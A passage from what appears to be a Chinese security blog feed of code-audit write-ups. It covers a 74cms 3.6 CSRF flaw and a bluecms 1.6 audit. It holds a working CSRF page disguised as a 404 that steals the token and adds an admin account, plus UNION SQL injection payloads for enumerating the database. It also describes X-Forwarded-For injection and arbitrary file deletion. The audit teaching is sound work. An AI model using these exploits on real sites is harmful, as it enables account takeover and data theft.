class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面利用ajax技术在后台将注册信息提交到<code>admin/admin_users.php</code></p><p>另外在74cms 3.6版本中添加了token机制认证，我们知道token认证机制是取出当前页面提交的token与存放在<strong>Session</strong>中的token值进行比较，相同则通过验证，每当我们刷新一次页面，token值就会发生变化。但是我们仍然可以进行CSRF攻击，办法就是利用iframe框架访问token值的页面，再利用js代码获取token值与信息一起提交即可，附上3.6版本csrf攻击的代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span>  <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">'hack'</span>).contentWindow.document.getElementsByName(<span class="string">'hiddentoken'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmldata = <span class="string">'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3&amp;hiddentoken='</span>+token;</span></span><br><span class="line"><span class="javascript">            xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users_save'</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.withCredentials=<span class="string">'true'</span>; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users"</span> <span class="attr">id</span>=<span class="string">'hack'</span> <span class="attr">border</span>=<span class="string">'0'</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"add()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该cms很多漏洞的利用点都在于未对SQL数组变量<code>$setsqlarr</code>进行过滤以及对后台输入只有转义处理，存在诸多输入过滤不足的情况</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--bluecms1.6</title>
    <link href="https://Foxgrin.github.io//posts/52227/"/>
    <id>https://Foxgrin.github.io//posts/52227/</id>
    <published>2019-03-13T11:15:00.000Z</published>
    <updated>2019-03-14T12:00:06.871Z</updated>
    
    <content type="html"><![CDATA[<p>记录bluecms1.6审计过程以及漏洞分析<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者属于新手，刚接触审计不久，刚拿到一个完全陌生的cms，一开始完全不知道如何下手，所以我通过不断阅读别人的审计文章，重点观察别人的审计思路，一开始看别人的审计文章其实不应该关注这个cms到底有什么漏洞，因为那都是别人已经审计好了的，你应该重点关注别人到底是怎么挖到这个洞的，这样你才能锻炼独立审计的能力，这篇文章我也会把我审计的全过程思路分享出来。</p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>首先拿到这个bluecms，安装完成后，我首先观察整个cms的文件结构</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>其实每个文件夹的功能从名字就大概能猜出，比如<code>/admin</code>肯定是后台管理员才能访问进行管理的；<code>/include</code>肯定是用来包含的全局文件，例如一些函数定义的文件，一些数据库配置，过滤文件等等；<code>/templates</code>肯定是一些模板文件，看到这个文件夹就能猜到这里面放着的都是一些html模板，用来通过后台进行渲染的。当然这都是初步的大致浏览，具体还要等到后面访问页面才知道。</p><p>下面，浏览了网页结构，就开始审计具体文件了，那么问题来了，审计哪个呢，这么多文件。这里我的思路还是首先访问根目录下的<code>index.php</code>文件，因为它是整个网站的首页。</p><p>先来看看首页的代码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>好多，将近300行，肯定不可能一行行的看，这里我首先还是先看主页面的开头包含了什么文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'include/common.inc.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure><p>前面说到<code>/include</code>文件夹，果然就包含了里面的文件，这些文件往往对我们审计过程都非常重要，一定要重视</p><p>先来看看<code>include/common.inc.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#30-36行</span></span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们马上就发现了在30-36行处，对全局数组POST，GET，COOKIES，REQUEST都进行了转义处理，所以只要通过这些方式输入的数据中存在单引号，双引号都会被转义。这就是为什么强调开头这些包含文件的重要性，如果我们没看到，就忽略了这些过滤，后面例如sql注入的注入点被单引号包裹，我们不知道有过滤还以为可以进行注入</p><p>另外在24-28行处还包含了一些函数文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> (BLUE_ROOT.<span class="string">'include/common.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cat.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/cache.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/user.fun.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">'include/index.fun.php'</span>);</span><br></pre></td></tr></table></figure><p>后面遇到看不懂的函数，可以通过跟踪函数名在这些文件中搜索</p><p>就这样大致浏览一下这些文件的开头部分，后面其实大多都是功能部分，我们有的其实都不用去关注，毕竟我们本来就不可能每行都去看一遍</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-跟踪输入变量"><a href="#1-跟踪输入变量" class="headerlink" title="1.跟踪输入变量"></a>1.跟踪输入变量</h3><p>笔者一开始审计，也是很盲目，看了半天代码，还是看不出哪儿存在漏洞，主要一个原因还是代码太多了。所以感觉挖掘漏洞，还是要有方法，有明确思路，这样才能有效快速。在我浏览别人的审计文章时，看到了一句话：“有输入的地方就可能存在漏洞”。这句话讲的很有道理，这么多的web漏洞，本质上都是存在用户的输入才导致的，所以，我一开始就是关注每个文件哪里存在用户的输入。</p><p>从根目录开始，按顺序我们先来看看<code>ad_js.php</code>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure><p>文件很短，我们可以一口气将它看完，开头就有我们可以通过GET方式进行控制的变量，继续看下去，我们马上就看到了一个sql查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>在前面我们说过，在<code>common.inc.php</code>文件中对我们的输入方式进行转义的过滤，我们注意到这个文件开头就包含了它，说明这里对<strong>$ad_id</strong>变量是存在转义处理的，但是这里的sql语句中<strong>$ad_id</strong>是没有单引号包裹的，所以我们根本不需要去关注过滤，很明显这里就存在了sql注入漏洞，具体利用后面在一起说</p><p>接下来是<code>ann.php</code>文件，这个文件就有点长，但是我们无需关心，只看开头有没有可以利用的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ann_id = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'ann_id'</span>]) ? intval($_REQUEST[<span class="string">'ann_id'</span>]) : <span class="string">''</span>;</span><br><span class="line">$cid = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'cid'</span>]) ? intval($_REQUEST[<span class="string">'cid'</span>]) : <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>可以看到，这里虽然输入变量，但是经过了<strong>intval</strong>函数的过滤处理，所以我们无法利用，这个文件我们就先pass掉，就这个道理继续往下看</p><p>来到<code>user.php</code>文件，存在可利用的变量$from和$act：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$act = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'act'</span>]) ? trim($_REQUEST[<span class="string">'act'</span>]) : <span class="string">'default'</span>;</span><br><span class="line">$from = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'from'</span>]) ? $_REQUEST[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br></pre></td></tr></table></figure><p>这个文件也很长，我们直接搜索关键字跟踪变量<strong>$from</strong>，发现大多数做为参数传入了<strong>showmsg</strong>函数，例如112行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmsg(<span class="string">'欢迎您 '</span>.$user_name.<span class="string">' 回来，现在将转到...'</span>, $from);</span><br></pre></td></tr></table></figure><p>我们可以大致猜到这个函数是用来进行页面跳转的，具体我们可以跟踪这个函数，这里我在<strong>seay审计系统</strong>中进行内容全局搜索<code>function showmsg</code>，查询结果在<code>/include/common.fun.php</code>文件中对这个函数进行了定义，审计该文件中的这个函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmsg</span><span class="params">($msg,$gourl=<span class="string">'goback'</span>, $is_write = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">global</span> $smarty;</span><br><span class="line"> $smarty-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"> $smarty-&gt;assign(<span class="string">"msg"</span>,$msg);</span><br><span class="line"> $smarty-&gt;assign(<span class="string">"gourl"</span>,$gourl);</span><br><span class="line"> $smarty-&gt;display(<span class="string">"showmsg.htm"</span>);</span><br><span class="line"> <span class="keyword">if</span>($is_write)</span><br><span class="line"> &#123;</span><br><span class="line"> write_log($msg, $_SESSION[<span class="string">'admin_name'</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面又利用了两个函数<strong>assign</strong>和<strong>display</strong>，同样继续跟踪这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_array($tpl_var))&#123;</span><br><span class="line">          <span class="keyword">foreach</span> ($tpl_var <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">              <span class="keyword">if</span> ($key != <span class="string">''</span>) &#123;</span><br><span class="line">                  <span class="keyword">$this</span>-&gt;_tpl_vars[$key] = $val;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">              <span class="keyword">$this</span>-&gt;_tpl_vars[$tpl_var] = $value;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($resource_name, $cache_id = null, $compile_id = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;fetch($resource_name, $cache_id, $compile_id, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>assign函数作用是将第二个参数作为键值，第一个参数作为键名。至于display函数，跟踪fetch函数有点长，这里我没有很详细的去看（其实是看不太懂…），只知道大致功能就是跳转页面。然后整个showmsg功能就是将assign中的数据渲染到display中的html页面。而这里传入参数<strong>$from</strong>，我们就可以猜测，可以通过该参数进行任意页面跳转的作用</p><p>依次类推，通过这个方法，相信只要耐心足够，一定很容易可以挖到一些漏洞</p><h3 id="2-通过工具审计漏洞"><a href="#2-通过工具审计漏洞" class="headerlink" title="2.通过工具审计漏洞"></a>2.通过工具审计漏洞</h3><p>第一种方法只是粗略的审计，一定还会有我们疏忽的漏洞，所以第二种方法，我用了审计工具来帮助我们进行审计，这里使用<strong>Seay审计系统</strong>，个人觉得还是不错的一款工具，还能进行关键字全局搜索。当然工具只是帮你分析可能存在的漏洞，并不是决定，具体我们还得一个个去耐心分析</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到，工具审计非常多可能存在的漏洞，但我还是按照第一种方法的思想，找存在输入的点，这样能更高效的寻找漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>例如上图，我们发现了变量<code>$ip</code>是通过头部的IP字段获取的，在这个字段我们是不用去关心转义过滤的，是个非常好利用的变量，所以我们赶紧跟踪<code>/include/common.fun.php</code>这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现这个关键函数<strong>getip</strong>，它返回的变量$ip我们是可以利用的，继续搜索这个函数getip，看看哪里可以利用到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现<code>/comment.php</code>文件中存在通过该函数拼接而成的sql语句，猜测就可能存在sql注入漏洞，跟踪该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br></pre></td></tr></table></figure><p>在113-114行找到了拼接的sql语句，我们可以通过伪造头部<code>X-Forwarded-For</code>字段来进行sql注入</p><p>依次类推，通过工具帮助我们审计，也能挖掘到更多漏洞</p><h3 id="3-搜索危险函数"><a href="#3-搜索危险函数" class="headerlink" title="3.搜索危险函数"></a>3.搜索危险函数</h3><p>第三种方法，我们还可以搜索一些导致漏洞的危险函数，例如<strong>unlink</strong>，<strong>include</strong>，<strong>move_uploaded_file</strong>函数等，这里搜索<strong>unlink</strong>函数为例</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>搜索结果显示出非常多unlink函数中存在我们可以输入进行控制的变量，例如<code>/user.php</code>下的616行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (file_exists(BLUE_ROOT.$_POST[&apos;lit_pic&apos;])) &#123;</span><br><span class="line">@unlink(BLUE_ROOT.$_POST[&apos;lit_pic&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就存在可以利用的变量<code>$_POST[&#39;lit_pic&#39;]</code>，我们跟踪该变量，发现除了开头包含文件的转义处理以外，无其他过滤地方，很明显我们就可以利用该变量进行网站根目录下任意文件删除的操作</p><h3 id="4-借鉴别人的文章"><a href="#4-借鉴别人的文章" class="headerlink" title="4.借鉴别人的文章"></a>4.借鉴别人的文章</h3><p>一开始审计，难免会有很多漏洞自己忽略掉没审计到，这时候我们就需要多去参考别人审计该cms的文章，寻找出自己未审计出的漏洞，并总结自己为什么没有找出该漏洞，这样就为下次审计积累更多的经验</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-UNION注入"><a href="#1-UNION注入" class="headerlink" title="1.UNION注入"></a>1.UNION注入</h3><p><code>/ad_js.php</code>第19行通过变量<code>$ad_id</code>拼接的sql语句由于变量<code>$ad_id</code>未进行过滤并且无引号包裹，存在SQL注入漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure><p>有回馈信息，所以我们直接用<strong>union注入</strong></p><p>首先通过<strong>order by</strong>测试查询字段数为7，然后通过测试得知回显字段在第6位</p><p>注数据库payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,database(),0</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注blue_ad表下的列名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x626c75655f6164),0</span><br></pre></td></tr></table></figure><p>注意将<strong>blue_ad</strong>转化为十六进制</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="2-INSERT-INTO注入"><a href="#2-INSERT-INTO注入" class="headerlink" title="2.INSERT INTO注入"></a>2.INSERT INTO注入</h3><p><code>/include/common.fun.php</code>下<strong>getip()</strong>函数返回存在通过头部IP字段获取的变量，跟踪该函数发现<code>comment.php</code>下第113行可利用getip()获取的可控变量进行sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure><p>这是一个添加评论功能的页面，功能整体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line"> $mood = intval($_POST[<span class="string">'mood'</span>]);</span><br><span class="line"> $content = !<span class="keyword">empty</span>($_POST[<span class="string">'comment'</span>]) ? htmlspecialchars($_POST[<span class="string">'comment'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $content = nl2br($content);</span><br><span class="line"> $type = intval($_POST[<span class="string">'type'</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> &#123;</span><br><span class="line"> showmsg(<span class="string">'评论内容不能为空'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>($_CFG[<span class="string">'comment_is_check'</span>] == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $is_check = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> $is_check = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br><span class="line"> 